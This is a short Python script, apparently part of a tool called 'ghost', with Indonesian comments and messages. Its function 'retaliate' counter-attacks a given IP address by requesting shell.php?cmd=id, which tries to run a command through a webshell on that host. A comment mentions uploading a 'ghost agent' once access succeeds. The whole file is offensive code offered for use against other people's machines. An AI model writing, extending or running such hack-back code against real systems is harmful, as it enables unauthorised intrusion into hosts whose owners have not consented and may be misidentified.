# ghost/counter_strike.py
import requests

def retaliate(target_ip):
    print(f"⚔️  Menyerang balik {target_ip}...")
    try:
        # Coba akses webshell atau RCE
        r = requests.get(f"http://{target_ip}/shell.php?cmd=id")
        if r.status_code == 200:
            print(f"🟢 Akses berhasil ke {target_ip}")
            # Bisa upload ghost agent
    except:
        print(f"🔴 Gagal akses {target_ip}")